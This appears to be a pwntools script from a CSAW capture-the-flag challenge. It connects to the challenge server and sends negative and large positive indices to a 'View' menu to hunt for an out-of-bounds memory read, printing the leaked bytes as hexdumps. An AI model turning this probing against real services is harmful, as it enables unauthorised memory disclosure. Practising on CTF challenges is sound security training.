#!/usr/bin/env python3
from pwn import *
import sys

def test_index(p, index):
    p.sendlineafter(b'3: Exit\n', b'V')  # View
    p.sendlineafter(b'Index : ', str(index).encode())
    try:
        response = p.recvuntil(b'1: Fill', timeout=1)
        return response.split(b'Data : ')[1].split(b'\n1: Fill')[0]
    except:
        return None

def hexdump_data(data):
    if data:
        return hexdump(data, bytes=8)
    return "No data received"

# Test negative indices
def test_negative_indices():
    print("\n=== Testing Negative Indices ===")
    p = remote('pwn.chal.csaw.io', 7900)
    for i in range(1, 21):
        idx = -i
        print(f"\nTesting index {idx}:")
        result = test_index(p, idx)
        print(hexdump_data(result))
    p.close()

# Test positive indices
def test_positive_indices():
    print("\n=== Testing Positive Indices ===")
    p = remote('pwn.chal.csaw.io', 7900)
    for i in range(256, 513, 8):
        print(f"\nTesting index {i}:")
        result = test_index(p, i)
        print(hexdump_data(result))
    p.close()

if __name__ == '__main__':
    test_negative_indices()
    test_positive_indices()

